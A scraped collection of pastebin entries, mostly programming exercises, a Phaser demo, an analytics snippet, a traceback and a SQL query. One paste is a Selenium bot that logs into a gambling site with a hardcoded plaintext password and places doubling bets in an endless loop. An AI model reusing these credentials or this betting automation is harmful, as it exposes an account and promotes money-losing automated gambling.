	//std::cout << start << "" "" << end << '\n';
	if (start == end) return;
	start = start > str.length() ? start - str.length() : start;
	end = end > str.length() ? end - str.length() : end;
	for (int i = start; i < end; ++i) {
		std::cout << str[i];
	}
	std::cout << '\n';
}
//‚Üê‚Üí‚Üë‚Üì
auto print_space = [](int j) {for (int i = 0; i < j; ++i) std::cout << "" "";};

void display_current_pointer_position(std::string& a, std::string& t, int i, int j) {
	print_space(i);
	std::cout << ""|\n"";
	print_str(a, 0, a.length());
	print_space(i - j);
	print_str(t, 0, t.length());
	print_space(i);
	std::cout << ""|\n\n"";
}

std::vector<int> kmp(char a, std::string& t, std::vector<int>& pi) {
	std::vector<int> res;
	int m = t.length();
	int i = 0, j = 0;
	while (a != '.') {
		if (a == t[j]) {
			++i; ++j;
			if (j == m) {
				res.push_back(i - m);
			}
			std::cin >> a;
		}
		else {
			if (j > 0) {
				//display_current_pointer_position(a, t, i, j);
				j = pi[j - 1];
			}
			else {
				++i;
				std::cin >> a;
			}
		}
		//display_current_pointer_position(a, t, i, j);
	}
	if (res.size() == 0) {
		res.push_back(-1);
	}
	return res;
}

//–ª–∏–ª–∏–ª–æ—Å—å –ª–∏–ª–∏–ª–∞—Å—å

int main() {
	std::string p;
	std::cin >> p;
	//std::string t;
	//std::cin >> t;
	std::vector<int> pi(p.length(), 0);
	form_suffix_array(pi, p);
	char a;
	std::cin >> a;
	std::vector<int> res = kmp(a, p, pi);
	for (int i = 0; i < res.size(); ++i) {
		if (i < res.size() - 1)
			std::cout << res[i] << ',';
		else
			std::cout << res[i];
	}
	std::cout << '\n';
	return 0;
}"
ZVadZUtk,Untitled,Josif_tepe,C++,Tuesday 23rd of April 2024 07:49:59 AM CDT,"#include <stdio.h>

int main()
{
    int n, m;
    scanf(""%d%d"", &n, &m);

    int A[n][n], B[m][m];

    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            scanf(""%d"", &A[i][j]);
        }
    }

    for(int i = 0; i < m; i++) {
        for(int j = 0; j < m; j++) {
            scanf(""%d"", &B[i][j]);
        }
    }
    int zbir_pod_glavna_A = 0, zbir_pod_glavna_B = 0;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            if(j < i) {
                zbir_pod_glavna_A += A[i][j];
            }
        }
    }

    for(int i = 0; i < m; i++) {
        for(int j = 0; j < m; j++) {
            if(j < i) {
                zbir_pod_glavna_B += B[i][j];
            }
        }
    }

    int pomal_od_n_i_m = 0;
    if(n < m) {
        pomal_od_n_i_m = n;
    }
    else {
        pomal_od_n_i_m = m;
    }

    for(int i = 0; i < pomal_od_n_i_m; i++) {
        if(A[i][i] == B[i][i]) {
            A[i][i] = zbir_pod_glavna_A;
            B[i][i] = zbir_pod_glavna_B;
        }
    }

    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            printf(""%d "", A[i][j]);
        }
        printf(""\n"");
    }
    for(int i = 0; i < m; i++) {
        for(int j =0 ; j < m; j++) {
            printf(""%d "", B[i][j]);
        }
        printf(""\n"");
    }
    return 0;
}
"
KGUewyzn,isometric,myarkqub,JavaScript,Tuesday 23rd of April 2024 07:47:42 AM CDT,"<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Document</title>
    <script src=""/phaserjs""></script>
</head>

<body>
    <script>

        let testbox
        let map = [
            [0, 0, 0, 0, 0, 0, 1, 1, 1, 1],
            [0, 0, 0, 0, 0, 0, 1, 1, 1, 1],
            [0, 0, 1, 1, 1, 1, 1, 1, 1, 1],
            [0, 0, 1, 1, 1, 1, 1, 1, 1, 1],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1],
            [0, 0, 1, 1, 1, 1, 1, 1, 1, 1],
            [1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
            [1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
            [1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
            [1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
        ]

        let map_tile

        class Scene1 extends Phaser.Scene {
            preload() {

            }

            create() {
                let offset = { x: 0, y: 0 }
                let tile_size = 64
                let tile_height = 8
                for (let y = 0; y < map.length; y++) {
                    for (let x = 0; x < map[y].length; x++) {
                        if (map[y][x] > 0) {
                            map_tile = this.add.isobox(x * (tile_size / 2) - (y * (tile_size / 2)) + offset.x, y * (tile_size / 4) + (x * (tile_size / 4)) + offset.y, tile_size, tile_height).setInteractive()
                            map_tile.on('pointerdown', function (pointer) {
                                this.setFillStyle(0xff0000);
                                console.log(x, y)
                            });

                            map_tile.on('pointerover', function (pointer) {

                                this.setFillStyle(0x00ff00, 0xffff00, 0xff0000);

                            });

                            map_tile.on('pointerout', function (pointer) {

                                this.setFillStyle(0xeeeeee, 0x999999, 0xcccccc);

                            });

                            map_tile.on('pointerup', function (pointer) {

                                this.setFillStyle(0xeeeeee, 0x999999, 0xcccccc);

                            });
                        }
                    }
                }

                const cursors = this.input.keyboard.createCursorKeys();
                this.cameras.main.centerOn(0, 150);
                const controlConfig = {
                    camera: this.cameras.main,
                    left: cursors.left,
                    right: cursors.right,
                    up: cursors.up,
                    down: cursors.down,
                    zoomIn: this.input.keyboard.addKey(Phaser.Input.Keyboard.KeyCodes.Q),
                    zoomOut: this.input.keyboard.addKey(Phaser.Input.Keyboard.KeyCodes.E),
                    acceleration: 0.02,
                    drag: 0.0005,
                    maxSpeed: 0.7
                };

                this.controls = new Phaser.Cameras.Controls.SmoothedKeyControl(controlConfig);
            }

            update(time, delta) {
                this.controls.update(delta);
            }
        }

        const config = {
            type: Phaser.AUTO,
            width: 800,
            height: 600,
            scene: Scene1
        };

        const game = new Phaser.Game(config);
    </script>
</body>

</html>"
8dfzna4a,Untitled,Josif_tepe,C++,Tuesday 23rd of April 2024 07:28:57 AM CDT,"#include <stdio.h>

int main()
{
    int n;
    scanf(""%d"", &n);
    
    int mat[n][n];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            scanf(""%d"", &mat[i][j]);
        }
    }

    int najgolem = 0;
    for(int i = 0; i < n; i++) {
        int brojac = 0;
        
        for(int j = 0; j < n; j++) {
            if(mat[i][j] == 1) {
                brojac++;
            }
            else {
                brojac = 0;
            }
            if(brojac > najgolem) {
                najgolem = brojac;
            }
        }
    }

    for(int j = 0; j < n; j++) {
        int brojac = 0;
        for(int i = 0; i < n; i++) {
            if(mat[i][j] == 1) {
                brojac++;
            }
            else {
                brojac = 0;
            }
            if(brojac > najgolem) {
                najgolem = brojac;
            }
        }
    }
    printf(""%d\n"", najgolem);

    return 0;
}
"
bRQfk9DL,snowybot python,coinwalk,JavaScript,Tuesday 23rd of April 2024 07:22:50 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys
import json
import time, re, math
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.service import Service
sys.setrecursionlimit(1000000000)
service = Service(executable_path=""/snap/bin/geckodriver"")
options = webdriver.FirefoxOptions()
options.add_argument(""--headless"")
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""madman"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future2000"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)
print(""logged in"") 
original = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
love = 0.00001
nice = love
tens = (love * 10)
hundreds = (love * 100)
sevens = (love * 6.9)
eights = (love * 7.9)
snowie = 0
funny = False
lamb = 2
silvery = original
awesome = ((math.floor(original / tens)) * tens)
joke = 144000000
goldern = 4
print(""should see bets"")

def go():
    global original
    global love
    global nice
    global tens
    global sevens
    global eights
    global snowie
    global funny
    global lamb
    global awesome
    global joke
    global goldern
    global silvery
    global hundreds
    belance = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
    coin = belance-original
    snow = round(coin, 8)
    bull = original-belance
    slob = round(bull, 8)
    if (snow>=0):
        print(""winning amount profit"")
        print(snow)
    if (bull>=0):
        print(""lossing amount losses"")
        print(slob)
    if ((belance>(((math.floor(belance/tens))*tens)+sevens)) and (belance<(((math.floor(belance/tens))*tens)+eights)) and (not(belance==snowie))):
        nice = nice*2
        snowie = (belance)
    if (((belance-(nice*2))<=0) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silvery = belance
        goldern = 2
        funny = True
        joke = ((math.ceil(belance/tens))*tens)
    if ((nice>=(love*goldern)) and (funny==False)):
        joke = ((math.ceil(belance/hundreds))*hundreds)
        funny = True
    if ((nice>=(love*goldern)) and (funny==True) and (belance>=joke) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        goldern = 4
        silvery = belance
        funny = False
        joke = 144000000
    if (belance<silvery):
        silvery = belance
    if (belance >= (original * 144000)):
        print(""winner winner chicken dinner"")
        return
    time.sleep(0.1)
    number = float(nice)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
zvjEeGAj,ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None],basedcount_bot,Python,Tuesday 23rd of April 2024 07:08:17 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 992, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1112, in create_connection
    transport, protocol = await self._create_connection_transport(
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1145, in _create_connection_transport
    await waiter
ConnectionAbortedError: SSL handshake is taking longer than 60.0 seconds: aborting the connection

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 46, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 228, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 64, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1194, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 578, in _request
    conn = await self._connector.connect(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 544, in connect
    proto = await self._create_connection(req, traces, timeout)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 911, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1235, in _create_direct_connection
    raise last_exc
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1204, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1000, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None]
"
sHWVVD66,2. f√©l√©v 11. h√©t,Levi0227,C#,Tuesday 23rd of April 2024 07:00:48 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    internal class Program
    {
        private static Random random = new Random();
        static void Main(string[] args)
        {
            List<Person> people = new List<Person>();
            for (int i = 0; i < 10; ++i) 
            {
                people.Add(new Person($""Person{i}"", (i + 1) * 10, random.Next(200, 1501)));
            }
            //people[4] = people[0];

            bool azE = HalmazE(people);
            Console.WriteLine(azE);
            
            bool tartE = TartalmazE(people, people[0]);
            Console.WriteLine(tartE);
            
            bool tartENemxD = TartalmazE(people, new Person(""xy"", 1, 1));
            Console.WriteLine(tartENemxD);

            bool reszE = ReszhalmazE(people, new List<Person>() { people[0], people[1], people[2] });
            Console.WriteLine(reszE);

            Console.Read();
        }

        private static bool HalmazE(List<Person> people)
        {
            int i = 1;
            while (i < people.Count && people[i] != people[i-1])
            {
                ++i;
            }

            return i == people.Count;
        }

        private static bool TartalmazE(List<Person> people, Person person)
        {
            int bal = 0;
            int jobb = people.Count-1;
            int center = (bal+jobb) / 2;

            while (bal <= jobb && people[center].CompareTo(person) != 0)
            {
                if (people[center].CompareTo(person) == -1)
                {
                    jobb = center - 1;
                }
                else
                {
                    bal = center + 1;
                }
                center = (bal+jobb) / 2; 
            }
            return bal <= jobb;
        }

        private static bool ReszhalmazE(List<Person> people, List<Person> people2)
        { 
            int j = 0;
            int i = 0;
            while (i < people.Count && j < people2.Count && people[i].Age >= people2[i].Age)
            {
                if (people[i] == people2[i])
                {
                    ++i;
                }
                ++j;
            }

            return i >= j;
        }
    }
}

---------------------------------------------------------------------------------------------------

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    internal class Person : IComparable
    {
        private int age;
        private int salary;
        private string name;

        public Person(string name, int age, int salary)
        {
            this.name = name;
            this.age = age;
            this.salary = salary;
        }

        public string Name { get => this.name; set => this.name = value; }
        public int Age { get => this.age; set => this.age = value; }
        public int Salary { get => this.salary; set => this.salary = value; }

        public int CompareTo(object obj)
        {
            if (obj == null)
            {
                Person p = obj as Person;

                if (p.age > this.age) return 1;
                if (p.age < this.age) return -1;
            }

            return 0;
        }
    }
}"
297Yw40e,GA4 - purchase - rtb copy,filipr27,JavaScript,Tuesday 23rd of April 2024 06:37:43 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'purchase',
  transaction_value_eur: '10920.00',  //Revenue of total transaction in EUR.
  ecommerce: {
    currency: 'RSD',							//Required. Transaction Currency - Type: Numeric
    value: 10920,								//Transaction Revenue  - Type: Numeric
    tax: 7.18,									//Transaction Tax - Type: Numeric
    shipping: 10.00,							//Transaction Shipping - Type: Numeric
    affiliation: 'My Parka Store',				//Optional. Transaction Affiliation -  - Type: string
    transaction_id: 'p115-20202000',			//Required. Transaction ID - Type: String
    coupon: '20%off',					//Coupon Code of applicable - Type: String
    items: [{
      item_name: 'Product 1',                    //Product Name - Type: string
      item_id: 'mp1122',                        //Product ID/SKU - Type: string
      price: '31.10',                           //Product price - Type: numeric
      item_brand: 'product brand',              //Product Brand- Type: string   
      item_category: 'Apparel',                 //Product Category - Type: string
      item_category2: 'Coats',                  //Product Sub-Category 1 - Type: string
      item_category3: 'Wool',                   //Product Sub-Category 2 - Type: string
      item_category4: 'Unisex',                 //Product Sub-Category 3 - Type: string
	  item_category5: 'cat5',                 //Product Sub-Category 4 - Type: string
      item_variant: 'Navy blue',                //Variant of other product like size, color et c - Type: string
      quantity: '3'                             //Product quantity - Type: integer
    },{
      item_name: 'stain removal',
      item_id: 'psr1332',
      price: '5.99',
      item_brand: 'product brand',
      item_category: 'Apparel',
      item_category2: 'Utility',
      item_category3: 'Care product',
	  item_category4: 'Unisex',            
	  item_category5:'cat5',
      quantity: '1'
    }]
  }
});"
y0XGBtzX,Untitled,35657,C++,Tuesday 23rd of April 2024 06:27:56 AM CDT,"#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>

using namespace std;


int main() {

    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);

    ifstream fin;
    fin.open(""file.txt"");

    ofstream fout;
    fout.open(""temp.txt"");

    if (!fin.is_open() || !fout.is_open()) {
        cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
    }
    else {
        // 1 –≤–∞—Ä–∏–∞–Ω—Ç
        char ch;
        while (fin.get(ch)) {
            if (ch >= '–ê' && ch <= '–Ø') {
                ch += 32;
            }
            fout << ch;
        }

        // 2 –≤–∞—Ä–∏–∞–Ω—Ç
       /* string str;
        while (getline(fin, str)) {
            for (int i = 0; i < str.size(); i++) {
                if (str[i] >= '–ê' && str[i] <= '–Ø') {
                    str[i] += 32;
                }
            }
            fout << str << endl;
        }*/

        fin.close();
        fout.close();
        remove(""file.txt"");
        rename(""temp.txt"", ""file.txt"");
    }
}"
B997SC4M,Untitled,_KAGATUN_,C#,Tuesday 23rd of April 2024 06:25:45 AM CDT,"using System;
using System.Collections.Generic;

class Program
{
    static void Main(string[] args)
    {
        const string AddFish = ""1"";
        const string RemoveFish = ""2"";
        const string ExitCommand = ""3"";

        Aquarium aquarium = new Aquarium();

        bool isWork = true;

        while (isWork)
        {
            Console.WriteLine($""–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ —Ä—ã–±–æ–∫ –≤ –∞–∫–≤–∞—Ä–∏—É–º–µ –º–æ–∂–µ—Ç –±—ã—Ç—å {aquarium.Capacity}\n"");

            aquarium.ShowFishes();

            Console.WriteLine($""\n–í–≤–µ–¥–∏—Ç–µ {AddFish} —á—Ç–æ–±—ã –¥–æ–±–∞–≤–∏—Ç—å —Ä—ã–±–∫—É –≤ –∞–∫–≤–∞—Ä–∏—É–º"");
            Console.WriteLine($""\n–í–≤–µ–¥–∏—Ç–µ {RemoveFish} —á—Ç–æ–±—ã —É–±—Ä–∞—Ç—å —Ä—ã–±–∫—É –∏–∑ –∞–∫–≤–∞—Ä–∏—É–º–∞"");
            Console.WriteLine($""\n–í–≤–µ–¥–∏—Ç–µ {ExitCommand} —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É"");

            string userInput = Console.ReadLine();

            Console.Clear();

            switch (userInput)
            {
                case AddFish:
                    aquarium.FillFishes();
                    break;

                case RemoveFish:
                    aquarium.RemoveFish();
                    break;

                case ExitCommand:
                    isWork = false;
                    break;

                default:
                    Console.WriteLine(""\n–ü—Ä–æ—à—ë–ª –≥–æ–¥\n"");
                    break;
            }

            aquarium.LiveYear();

            Console.ReadKey();
            Console.Clear();
        }
    }

    class Fish
    {
        public Fish(string name, int maxAge)
        {
            Age = 0;
            Name = name;
            MaxAge = maxAge;
        }

        public string Name { get; protected set; }
        public int MaxAge { get; protected set; }
        public int Age { get; protected set; }

        public bool IsAlive => Age < MaxAge;

        public void ShowInfoFish()
        {
            Console.WriteLine($""–ù–∞–∑–≤–∞–Ω–∏–µ —Ä—ã–±–∫–∏ {Name}. –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π –≤–æ–∑—Ä–∞—Å—Ç {MaxAge}."");
        }

        public void ShowFish()
        {
            if (IsAlive)
            {
                Console.WriteLine($""–†—ã–±–∫–µ {Name} –ª–µ—Ç {Age}."");
            }
            else
            {
                Console.WriteLine($""–†—ã–±–∫–∞ {Name} –º–µ—Ä—Ç–≤–∞."");
            }
        }

        public void AddAge()
        {
            Age++;
        }
    }

    class Cardinal : Fish
    {
        public Cardinal() : base(""–ö–∞—Ä–¥–∏–Ω–∞–ª"", 4) { }
    }

    class Goldfish : Fish
    {
        public Goldfish() : base(""–ó–æ–ª–æ—Ç–∞—è —Ä—ã–±–∫–∞"", 30) { }
    }

    class Severum : Fish
    {
        public Severum() : base(""–°–µ–≤–µ—Ä—É–º"", 15) { }
    }

    class BlackLabeo : Fish
    {
        public BlackLabeo() : base(""–ß—ë—Ä–Ω—ã–π –ª–∞–±–µ–æ"", 7) { }
    }

    class SilverMetynnis : Fish
    {
        public SilverMetynnis() : base(""–ú–µ—Ç–∏–Ω–Ω–∏—Å —Å–µ—Ä–µ–±—Ä–∏—Å—Ç—ã–π"", 8) { }
    }

    class Discus : Fish
    {
        public Discus() : base(""–î–∏—Å–∫—É—Å"", 18) { }
    }

    class Aquarium
    {
        private List<Fish> _fishes = new List<Fish>();

        public int Capacity { get; private set; } = 5;

        public int FishesCount => _fishes.Count;

        public void ShowFishes()
        {
            if (_fishes.Count > 0)
            {
                for (int i = 0; i < _fishes.Count; i++)
                {
                    _fishes[i].ShowFish();
                }
            }
            else
            {
                Console.WriteLine(""–ê–∫–≤–∞—Ä–∏—É–º –ø—É—Å—Ç–æ–π"");
            }
        }

        public void LiveYear()
        {
            for (int i = 0; i < _fishes.Count; i++)
            {
                if (_fishes[i].IsAlive)
                {
                    _fishes[i].AddAge();
                }
            }
        }

        public void RemoveFish()
        {
            if (_fishes.Count > 0)
            {
                for (int i = 0; i < _fishes.Count; i++)
                {
                    Console.WriteLine((i + 1) + ""‚Ññ "");
                    _fishes[i].ShowFish();
                }

                Console.WriteLine(""\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ä—ã–±–∫–∏ –¥–ª—è –µ—ë —É–¥–∞–ª–µ–Ω–∏—è\n"");
                string numberGladiator = Console.ReadLine();

                if (int.TryParse(numberGladiator, out int index))
                {
                    if (index > 0 && index <= _fishes.Count)
                    {
                        _fishes.RemoveAt(index - 1);

                        Console.WriteLine(""\n–†—ã–±–∫–∞ —É–¥–∞–ª–µ–Ω–∞\n"");
                    }
                    else
                    {
                        Console.WriteLine(""\n–†—ã–±–∫–∏ –ø–æ–¥ —Ç–∞–∫–∏–º –Ω–æ–º–µ—Ä–æ–º –Ω–µ—Ç\n"");
                    }
                }
                else
                {
                    Console.WriteLine(""\n–†—ã–±–∫–∏ –ø–æ–¥ —Ç–∞–∫–∏–º –Ω–æ–º–µ—Ä–æ–º –Ω–µ—Ç\n"");
                }
            }
            else
            {
                Console.WriteLine(""–ê–∫–≤–∞—Ä–∏—É–º –ø—É—Å—Ç–æ–π"");
            }
        }

        public void FillFishes()
        {
            if (Capacity > _fishes.Count)
            {
                _fishes.Add(GetFish());
                Console.WriteLine(""\n–†—ã–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∞"");
            }
            else
            {
                Console.WriteLine(""–ê–∫–≤–∞—Ä–∏—É–º –∑–∞–ø–æ–ª–Ω–µ–Ω"");
            }
        }

        private Fish GetFish()
        {
            List<Fish> fishes = new List<Fish> {
            new Cardinal (),
            new Goldfish(),
            new Severum(),
            new BlackLabeo(),
            new SilverMetynnis(),
            new Discus() };

            for (int i = 0; i < fishes.Count; i++)
            {
                Console.WriteLine((i + 1) + ""‚Ññ "");
                fishes[i].ShowInfoFish();
            }

            Fish selectedFish = null;

            Console.WriteLine(""\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ä—ã–±–∫–∏ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –µ—ë –≤ –∞–∫–≤–∞—Ä–∏—É–º"");

            bool isWorks = true;

            while (isWorks)
            {
                string numberGladiator = Console.ReadLine();

                if (int.TryParse(numberGladiator, out int index))
                {
                    if (index > 0 && index <= fishes.Count)
                    {
                        selectedFish = fishes[index - 1];

                        return selectedFish;
                    }
                }

                Console.WriteLine(""\n–†—ã–±–∫–∏ –ø–æ–¥ —Ç–∞–∫–∏–º –Ω–æ–º–µ—Ä–æ–º –Ω–µ—Ç\n"");
            }

            return selectedFish;
        }
    }
}
"
nxtvQ1Cj,SQL,sergyo,PostgreSQL,Tuesday 23rd of April 2024 06:22:12 AM CDT,"SELECT CAST(CASE
                WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ROUND(CAST(COALESCE(""a"".""received_quantity"", COALESCE(""a"".""received_quantity"", ""e"".""internal_quantity"")) AS numeric), %s)
            END AS FLOAT8) AS ""received_quantity"",
       CAST(ROUND(CAST(CASE
                           WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                           ELSE %s
                       END AS numeric), %s) AS FLOAT8) AS ""destination_quantity"",
       CAST((""q"".""unit_price"" * COALESCE(""a"".""destination_quantity"", %s)) AS NUMERIC) AS ""sale_amount"",
       CAST(CASE
                WHEN ((""s"".""sale_line"" IS NOT NULL)
                      AND (COALESCE(SUM(""a"".""destination_quantity"") OVER ""bx"", %s) != %s)) THEN ROUND(CAST((COALESCE(""s"".""amount"", %s) * (COALESCE(""a"".""destination_quantity"", %s) / SUM(""a"".""destination_quantity"") OVER ""bx"")) AS NUMERIC), ""l"".""digits"")
            END AS NUMERIC) AS ""invoice_amount"",
       CAST(CASE
                WHEN ((""s"".""sale_line"" IS NOT NULL)
                      AND (COALESCE(SUM(""a"".""destination_quantity"") OVER ""bx"", %s) != %s)) THEN ROUND(CAST((COALESCE(""s"".""quantity"", %s) * (COALESCE(""a"".""destination_quantity"", %s) / SUM(""a"".""destination_quantity"") OVER ""bx"")) AS numeric), %s)
            END AS FLOAT8) AS ""invoice_quantity"",
       CAST(CASE
                WHEN (COALESCE(""n"".""internal_quantity"", %s) = %s) THEN %s
                ELSE ROUND((CAST(COALESCE(""n"".""cases_quantity"", %s) AS numeric) * CAST((ROUND(CAST(CASE
                                                                                                       WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                                                       ELSE %s
                                                                                                   END AS numeric), %s) / CAST(""n"".""internal_quantity"" AS numeric)) AS numeric)), %s)
            END AS FLOAT8) AS ""destination_cases_quantity"",
       CAST(COALESCE(COALESCE(CASE
                                  WHEN ((""s"".""sale_line"" IS NOT NULL)
                                        AND (COALESCE(SUM(""a"".""destination_quantity"") OVER ""bx"", %s) != %s)) THEN ROUND(CAST((COALESCE(""s"".""amount"", %s) * (COALESCE(""a"".""destination_quantity"", %s) / SUM(""a"".""destination_quantity"") OVER ""bx"")) AS NUMERIC), ""l"".""digits"")
                              END, (""q"".""unit_price"" * COALESCE(""a"".""destination_quantity"", %s))), %s) AS NUMERIC) AS ""income_amount"",
       CAST(CASE
                WHEN (COALESCE(""n"".""internal_quantity"", %s) = %s) THEN %s
                ELSE (- ROUND(CAST((""n"".""bom_amount"" * (ROUND(CAST(CASE
                                                                       WHEN (""a"".""destination_unit_load"" IS NOT NULL) THEN COALESCE(""a"".""destination_quantity"", %s)
                                                                       ELSE %s
                                                                   END AS numeric), %s) / ""n"".""internal_quantity"")) AS NUMERIC), ""l"".""digits""))
            END AS NUMERIC) AS ""bom_amount"",
       CAST(""e"".""create_date"" AS TIMESTAMP) AS ""create_date"",
       CAST(""e"".""write_date"" AS TIMESTAMP) AS ""write_date"",
       CAST(""e"".""create_uid"" AS INT4) AS ""create_uid"",
       CAST(""e"".""write_uid"" AS INT4) AS ""write_uid"",
       CAST(""e"".""company"" AS INT4) AS ""company"",
       CAST(CASE
                WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ""e"".""id""
                ELSE %s
            END AS INT4) AS ""received_unit_load"",
       CAST(CASE
                WHEN (""e"".""goods_receipt_line"" IS NOT NULL) THEN ""e"".""product""
                ELSE %s
            END AS INT4) AS ""received_product"",
       CAST(CAST(""j"".""effective_date"" AS date) AS DATE) AS ""receipt_date"",
       CAST(""h"".""receipt"" AS INT4) AS ""receipt"",
       CAST(""h"".""entry"" AS INT4) AS ""goods_entry"",
       CAST(""i"".""producer"" AS INT4) AS ""producer"",
       CAST(""i"".""origin"" AS VARCHAR) AS ""entry_origin"",
       CAST(CASE
                WHEN (COALESCE(""i"".""origin"", %s) LIKE %s ESCAPE %s) THEN CAST(SUBSTRING(""i"".""origin""
                                                                                        FROM (POSITION(%s IN ""i"".""origin"") + %s)) AS INT4)
                ELSE %s
            END AS INT4) AS ""batch"",
       CAST(""i"".""base_product"" AS INT4) AS ""base_product"",
       CAST(""i"".""crop"" AS INT4) AS ""crop"",
       CAST(""r"".""id"" AS INT4) AS ""sale"",
       CAST(""q"".""id"" AS INT4) AS ""sale_line"",
       CAST(""q"".""unit_price"" AS NUMERIC) AS ""sale_unit_price"",
       CAST(""r"".""party"" AS INT4) AS ""customer"",
       CAST(""r"".""shipment_party"" AS INT4) AS ""shipment_party"",
       CAST(""g"".""default_uom"" AS INT4) AS ""uom"",
